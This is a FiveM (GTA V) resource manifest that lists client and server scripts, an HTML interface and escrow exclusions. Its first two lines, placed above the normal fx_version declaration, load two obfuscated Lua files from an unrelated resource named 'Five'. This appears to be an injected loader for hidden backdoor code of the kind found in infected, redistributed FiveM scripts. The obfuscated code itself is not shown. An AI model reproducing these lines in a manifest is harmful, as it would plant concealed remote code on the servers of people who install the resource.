shared_script '@Five/ai_module_fg-obfuscated.lua'
shared_script '@Five/shared_fg-obfuscated.lua'
fx_version "cerulean"

game "gta5"

shared_script "config.lua"

client_scripts {
    "client/*.lua",
}

ui_page "html/index.html"

files {
    "html/index.html",
    "html/style.css",
    "html/script.js",
    "html/*.png",
}

server_scripts {
    "server/*.lua"
}

lua54 'yes'

escrow_ignore {
    'client/*.lua',
    'server/*.lua',
    '[items]/*.lua',
    'config.lua'
}
dependency '/assetpacks'